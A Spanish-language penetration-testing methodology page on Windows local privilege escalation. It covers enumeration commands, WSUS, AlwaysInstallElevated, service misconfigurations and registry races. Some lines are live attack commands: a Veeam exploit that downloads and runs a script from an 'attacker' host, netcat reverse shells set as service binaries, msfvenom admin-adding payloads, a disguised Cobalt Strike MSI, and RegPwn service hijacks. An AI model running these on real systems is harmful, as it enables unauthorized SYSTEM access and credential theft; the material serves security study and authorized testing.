# Escalada de privilegios local en Windows

{{#include ../../banners/hacktricks-training.md}}

### **Mejor herramienta para buscar vectores de escalada de privilegios local en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Esta página consolida la metodología general de escalada de privilegios en Windows a partir de varias guías fundamentales.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Su flujo práctico de enumeración también se basa en talleres y checklists de la comunidad.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> El material histórico sobre ataques incluye la presentación de DerbyCon sobre la escalada de privilegios en Windows.<sup>[[5]](#references)</sup>

## Teoría inicial de Windows

### Access Tokens

**Si no sabes qué son los access tokens de Windows, lee la siguiente página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la siguiente página para obtener más información sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Niveles de integridad

**Si no sabes qué son los niveles de integridad en Windows, lee la siguiente página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de seguridad de Windows

Hay diferentes elementos en Windows que podrían **impedirte enumerar el sistema**, ejecutar ejecutables o incluso **detectar tus actividades**. Debes **leer** la siguiente **página** y **enumerar** todos estos **mecanismos** de **defensa** antes de comenzar la enumeración de escalada de privilegios:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Protección de administrador / elevación silenciosa mediante UIAccess

Los procesos UIAccess iniciados mediante `RAiLaunchAdminProcess` pueden abusarse para alcanzar un nivel de integridad alto sin mostrar avisos cuando se evitan las comprobaciones de ruta segura de AppInfo. Consulta aquí el flujo de bypass específico de UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagación del registro de accesibilidad de Secure Desktop puede abusarse para realizar una escritura arbitraria en el registro como SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Las versiones recientes de Windows también introdujeron una ruta de LPE mediante **SMB arbitrary-port**, donde una autenticación NTLM local privilegiada se refleja a través de una conexión TCP de SMB reutilizada:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Información del sistema

### Enumeración de la información de versión

Comprueba si la versión de Windows tiene alguna vulnerabilidad conocida (comprueba también los parches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits de versiones

Este [sitio](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre las vulnerabilidades de seguridad de Microsoft. Esta base de datos contiene más de 4.700 vulnerabilidades de seguridad, lo que demuestra la **enorme superficie de ataque** que presenta un entorno Windows.

**En el sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tiene watson integrado)_

**Localmente con información del sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositorios de Github de exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Entorno

¿Hay información de credenciales/Juicy guardada en las variables de entorno?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historial de PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Archivos de transcripción de PowerShell

Puedes aprender a activarlo en [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Los detalles de las ejecuciones de pipelines de PowerShell se registran, incluidos los comandos ejecutados, las invocaciones de comandos y partes de los scripts. Sin embargo, es posible que no se capturen todos los detalles de ejecución ni los resultados de salida.

Para habilitarlo, sigue las instrucciones de la sección "Transcript files" de la documentación y selecciona **"Module Logging"** en lugar de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver los últimos 15 eventos de los logs de PowerShell, puedes ejecutar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Se captura un registro completo de la actividad y de todo el contenido de la ejecución del script, garantizando que cada bloque de código quede documentado mientras se ejecuta. Este proceso conserva un registro de auditoría exhaustivo de cada actividad, valioso para el análisis forense y el análisis de comportamientos maliciosos. Al documentar toda la actividad en el momento de la ejecución, se proporciona información detallada sobre el proceso.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Los eventos de registro del **Script Block** se pueden localizar en el Visor de eventos de Windows, en la ruta: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para ver los últimos 20 eventos, puedes usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configuración de Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unidades
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puedes comprometer el sistema si las actualizaciones no se solicitan mediante http**S**, sino mediante http.

Comienza comprobando si la red utiliza una actualización de WSUS sin SSL ejecutando lo siguiente en cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
O lo siguiente en PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si recibes una respuesta como una de estas:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Y si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` es igual a `1`.

Entonces, **es explotable.** Si el último registro es igual a 0, la entrada de WSUS será ignorada.

Para explotar estas vulnerabilidades puedes usar herramientas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Estos son scripts de exploits MiTM preparados para inyectar updates 'fake' en tráfico WSUS sin SSL.

Lee la investigación aquí:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lee el informe completo aquí**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Básicamente, este es el fallo que explota este bug:

> Si tenemos la capacidad de modificar el proxy de nuestro usuario local, y Windows Updates utiliza el proxy configurado en los ajustes de Internet Explorer, entonces tenemos la capacidad de ejecutar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nuestro propio tráfico y ejecutar código como un usuario elevado en nuestro asset.
>
> Además, dado que el servicio WSUS utiliza los ajustes del usuario actual, también utilizará su certificate store. Si generamos un certificado autofirmado para el hostname de WSUS y añadimos este certificado al certificate store del usuario actual, podremos interceptar tanto el tráfico HTTP como el HTTPS de WSUS. WSUS no utiliza mecanismos similares a HSTS para implementar un tipo de validación trust-on-first-use del certificado. Si el certificado presentado es trusted por el usuario y tiene el hostname correcto, será aceptado por el servicio.

Puedes explotar esta vulnerabilidad utilizando la herramienta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una vez que sea liberada).

## Actualizadores automáticos de terceros e IPC de agentes (local privesc)

Muchos agentes empresariales exponen una superficie IPC en localhost y un canal de actualización privilegiado. Si el enrollment puede ser coaccionado hacia un servidor del atacante y el updater confía en una rogue root CA o en comprobaciones débiles del signer, un usuario local puede entregar un MSI malicioso que el servicio SYSTEM instala. Consulta una técnica generalizada (basada en la cadena de Netskope stAgentSvc – CVE-2025-0309) aquí:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM mediante TCP 9401)

Veeam B&R < `11.0.1.1261` expone un servicio en localhost en **TCP/9401** que procesa mensajes controlados por el atacante, permitiendo ejecutar comandos arbitrarios como **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: confirma el listener y la versión, por ejemplo, `netstat -ano | findstr 9401` y `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: coloca un PoC como `VeeamHax.exe` con las DLL de Veeam requeridas en el mismo directorio y, a continuación, activa un payload SYSTEM mediante el socket local:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
El servicio ejecuta el comando como SYSTEM.
## KrbRelayUp

Existe una vulnerabilidad de **escalada de privilegios local** en entornos de **dominio** de Windows bajo condiciones específicas. Estas condiciones incluyen entornos en los que la firma **LDAP** no está impuesta, los usuarios tienen **self-rights** que les permiten configurar **Resource-Based Constrained Delegation (RBCD)** y los usuarios pueden crear equipos dentro del dominio. Es importante señalar que estos **requisitos** se cumplen con la configuración predeterminada.

Encuentra el **exploit en** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para obtener más información sobre el flujo del ataque, consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Si** estas 2 claves del registro están **habilitadas** (el valor es **0x1**), los usuarios con cualquier nivel de privilegios pueden **instalar** (ejecutar) archivos `*.msi` como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloads de Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
Si tienes una sesión de meterpreter, puedes automatizar esta técnica utilizando el módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Utiliza el comando `Write-UserAddMSI` de PowerUP para crear, dentro del directorio actual, un binario MSI de Windows para escalar privilegios. Este script genera un instalador MSI precompilado que solicita añadir un usuario/grupo (por lo que necesitarás acceso GIU):
```
Write-UserAddMSI
```
Simplemente ejecuta el binario creado para escalar privilegios.

### MSI Wrapper

Lee este tutorial para aprender a crear un MSI wrapper usando estas tools. Ten en cuenta que puedes envolver un archivo "**.bat**" si **solo** quieres **ejecutar** **líneas de comandos**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuevo payload TCP EXE de Windows** en `C:\privesc\beacon.exe`
- Abre **Visual Studio**, selecciona **Create a new project** y escribe "installer" en el cuadro de búsqueda. Selecciona el proyecto **Setup Wizard** y haz clic en **Next**.
- Asigna un nombre al proyecto, como **AlwaysPrivesc**, usa **`C:\privesc`** como ubicación, selecciona **place solution and project in the same directory** y haz clic en **Create**.
- Sigue haciendo clic en **Next** hasta llegar al paso 3 de 4 (elegir los archivos que se incluirán). Haz clic en **Add** y selecciona el payload Beacon que acabas de generar. Después, haz clic en **Finish**.
- Resalta el proyecto **AlwaysPrivesc** en el **Solution Explorer** y, en **Properties**, cambia **TargetPlatform** de **x86** a **x64**.
- Hay otras propiedades que puedes cambiar, como **Author** y **Manufacturer**, que pueden hacer que la aplicación instalada parezca más legítima.
- Haz clic derecho en el proyecto y selecciona **View > Custom Actions**.
- Haz clic derecho en **Install** y selecciona **Add Custom Action**.
- Haz doble clic en **Application Folder**, selecciona el archivo **beacon.exe** y haz clic en **OK**. Esto garantizará que el payload Beacon se ejecute en cuanto se ejecute el instalador.
- En **Custom Action Properties**, cambia **Run64Bit** a **True**.
- Por último, **compílalo**.
- Si aparece la advertencia `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, asegúrate de establecer la plataforma en x64.

### Instalación de MSI

Para ejecutar la **instalación** del archivo `.msi` malicioso en **segundo plano:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explotar esta vulnerabilidad puedes usar: _exploit/windows/local/always_install_elevated_

## Antivirus y detectores

### Configuración de auditoría

Esta configuración determina qué se está **registrando**, así que debes prestar atención
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding; es interesante saber a dónde se envían los logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** está diseñado para la **gestión de contraseñas de Administrador local**, garantizando que cada contraseña sea **única, aleatoria y actualizada periódicamente** en los equipos unidos a un dominio. Estas contraseñas se almacenan de forma segura en Active Directory y solo pueden ser consultadas por usuarios a los que se hayan otorgado permisos suficientes mediante ACLs, lo que les permite ver las contraseñas de administrador local si están autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si está activo, las **contraseñas en texto plano se almacenan en LSASS** (Local Security Authority Subsystem Service).\
[**Más información sobre WDigest en esta página**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

A partir de **Windows 8.1**, Microsoft introdujo una protección mejorada para la Autoridad de seguridad local (LSA) con el fin de **bloquear** los intentos de procesos no confiables de **leer su memoria** o inyectar código, protegiendo aún más el sistema.\
[**Más información sobre LSA Protection aquí**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** se introdujo en **Windows 10**. Su propósito es proteger las credenciales almacenadas en un dispositivo frente a amenazas como los ataques pass-the-hash. [**Aquí hay más información sobre Credential Guard.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenciales almacenadas en caché

Las **credenciales de dominio** son autenticadas por la **Local Security Authority** (LSA) y utilizadas por los componentes del sistema operativo. Cuando los datos de inicio de sesión de un usuario son autenticados por un paquete de seguridad registrado, normalmente se establecen las credenciales de dominio del usuario.\
[**Más información sobre Cached Credentials aquí**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuarios y grupos

### Enumerar usuarios y grupos

Debes comprobar si alguno de los grupos a los que perteneces tiene permisos interesantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Si **perteneces a algún grupo privilegiado, es posible que puedas escalar privilegios**. Obtén más información sobre los grupos privilegiados y cómo abusar de ellos para escalar privilegios aquí:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulación de tokens

**Obtén más información** sobre qué es un **token** en esta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la siguiente página para **aprender sobre tokens interesantes** y cómo abusar de ellos:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuarios conectados / Sesiones
```bash
qwinsta
klist sessions
```
### Carpetas de inicio
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Política de contraseñas
```bash
net accounts
```
### Obtener el contenido del portapapeles
```bash
powershell -command "Get-Clipboard"
```
## Procesos en ejecución

### Permisos de archivos y carpetas

En primer lugar, al enumerar los procesos, **comprueba si hay contraseñas dentro de la línea de comandos del proceso**.\
Comprueba si puedes **sobrescribir algún binario en ejecución** o si tienes permisos de escritura en la carpeta del binario para explotar posibles [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Comprueba siempre si hay [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) ejecutándose; podrías abusar de ellos para escalar privilegios.

**Comprobación de los permisos de los binarios de los procesos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Comprobación de los permisos de las carpetas de los binarios de los procesos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Extracción de contraseñas de la memoria

Puedes crear un volcado de memoria de un proceso en ejecución utilizando **procdump** de sysinternals. Los servicios como FTP tienen las **credenciales en texto claro en la memoria**; intenta volcar la memoria y leer las credenciales.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicaciones GUI inseguras

**Las aplicaciones que se ejecutan como SYSTEM pueden permitir que un usuario inicie un CMD o explore directorios.**

Ejemplo: "Windows Help and Support" (Windows + F1), busca "command prompt" y haz clic en "Click to open Command Prompt"

## Services

Service Triggers permiten que Windows inicie un servicio cuando se producen determinadas condiciones (actividad de named pipe/RPC endpoint, eventos ETW, disponibilidad de IP, conexión de dispositivos, actualización de GPO, etc.). Incluso sin derechos SERVICE_START, a menudo puedes iniciar servicios privilegiados activando sus triggers. Consulta las técnicas de enumeración y activación aquí:

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtén una lista de servicios:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permisos

Puedes usar **sc** para obtener información sobre un servicio
```bash
sc qc <service_name>
```
Se recomienda tener el binario **accesschk** de _Sysinternals_ para comprobar el nivel de privilegios necesario para cada servicio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Se recomienda comprobar si "Authenticated Users" puede modificar algún servicio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Puedes descargar accesschk.exe para XP desde aquí](https://github.com/ankh2054/windows-pentest/raw/master/Privilege/accesschk-2003-xp.exe)

### Habilitar el servicio

Si tienes este error (por ejemplo, con SSDPSRV):

_Se ha producido el error del sistema 1058._\
_El servicio no se puede iniciar porque está deshabilitado o porque no tiene dispositivos habilitados asociados._

Puedes habilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Ten en cuenta que el servicio upnphost depende de SSDPSRV para funcionar (en XP SP1)**

**Otra solución alternativa** a este problema es ejecutar:
```
sc.exe config usosvc start= auto
```
### **Modificar la ruta del binario del servicio**

En el escenario en el que el grupo "Authenticated users" posee **SERVICE_ALL_ACCESS** sobre un servicio, es posible modificar el binario ejecutable del servicio. Para modificarlo y ejecutar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar servicio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Los privilegios pueden escalarse mediante varios permisos:

- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar el binario del servicio.
- **WRITE_DAC**: Permite reconfigurar permisos, lo que posibilita cambiar las configuraciones del servicio.
- **WRITE_OWNER**: Permite adquirir la propiedad y reconfigurar permisos.
- **GENERIC_WRITE**: Hereda la capacidad de cambiar las configuraciones del servicio.
- **GENERIC_ALL**: También hereda la capacidad de cambiar las configuraciones del servicio.

Para la detección y explotación de esta vulnerabilidad, se puede utilizar _exploit/windows/local/service_permissions_.

### Permisos débiles en los binarios de los servicios

Si un servicio se ejecuta como **`LocalSystem`**, **`LocalService`**, **`NetworkService`** o con una cuenta de dominio privilegiada, pero **los usuarios con pocos privilegios pueden modificar el EXE del servicio o su carpeta principal**, a menudo se puede secuestrar el servicio **reemplazando el binario y reiniciando el servicio**.

**Comprueba si puedes modificar el binario que ejecuta un servicio** o si tienes **permisos de escritura en la carpeta** donde se encuentra el binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puedes obtener todos los binarios que ejecuta un servicio usando **wmic** (no en system32) y comprobar tus permisos usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
También puedes usar **sc** e **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Busca ACL peligrosas concedidas a **`Everyone`**, **`BUILTIN\Users`** o **`Authenticated Users`**, especialmente **`(F)`**, **`(M)`** o **`(W)`** sobre el ejecutable del servicio o el directorio que lo contiene. Un flujo práctico de abuso es:<sup>[[27]](#references)</sup>

1. Confirma la cuenta del servicio y la ruta del ejecutable con `sc qc <service_name>`.
2. Confirma que se puede escribir en el binario con `icacls <path>`.
3. Reemplaza el binario del servicio por un payload o por un binario de servicio malicioso válido.
4. Reinicia el servicio con `sc stop <service_name> && sc start <service_name>` (o espera a un reinicio / trigger del servicio).

Comprobaciones automatizadas útiles:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Si el servicio no permite que un usuario normal lo reinicie, comprueba si se inicia automáticamente durante el arranque, tiene una acción de error que lo vuelve a iniciar o puede activarse indirectamente mediante la aplicación que lo utiliza.

### Permisos de modificación del registro de servicios

Debes comprobar si puedes modificar algún registro de servicio.\
Puedes **comprobar** tus **permisos** sobre un **registro** de servicio haciendo lo siguiente:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Debe comprobarse si **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** poseen permisos `FullControl`. En ese caso, se puede modificar el binario ejecutado por el servicio.

Para cambiar la ruta del binario ejecutado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Race de symlink del registro para escribir valores arbitrarios en HKLM (ATConfig)

Algunas funciones de accesibilidad de Windows crean claves **ATConfig** por usuario que posteriormente son copiadas por un proceso **SYSTEM** a una clave de sesión en HKLM. Una **carrera de symlink** del registro puede redirigir esa escritura privilegiada a **cualquier ruta de HKLM**, proporcionando una primitiva de **escritura arbitraria de valores en HKLM**.<sup>[[18]](#references)</sup>

Ubicaciones clave (ejemplo: el teclado en pantalla `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` enumera las funciones de accesibilidad instaladas.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` almacena la configuración controlada por el usuario.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` se crea durante el inicio de sesión o las transiciones al secure desktop y el usuario puede escribir en ella.

Flujo de abuso (CVE-2026-24291 / ATConfig):

1. Rellena el valor de **HKCU ATConfig** que quieres que escriba SYSTEM.
2. Activa la copia al secure desktop (por ejemplo, **LockWorkstation**), lo que inicia el flujo del broker de AT.
3. **Gana la carrera** colocando un **oplock** en `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; cuando se active el oplock, reemplaza la clave **HKLM Session ATConfig** por un **registry link** que apunte a un destino protegido de HKLM.
4. SYSTEM escribe el valor elegido por el atacante en la ruta HKLM redirigida.

Una vez que tengas una escritura arbitraria de valores en HKLM, realiza el pivot a LPE sobrescribiendo valores de configuración de servicios:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/línea de comandos)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Elige un servicio que un usuario normal pueda iniciar (por ejemplo, **`msiserver`**) y actívalo después de la escritura. **Nota:** la implementación pública del exploit **bloquea la workstation** como parte de la carrera.

Herramientas de ejemplo (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
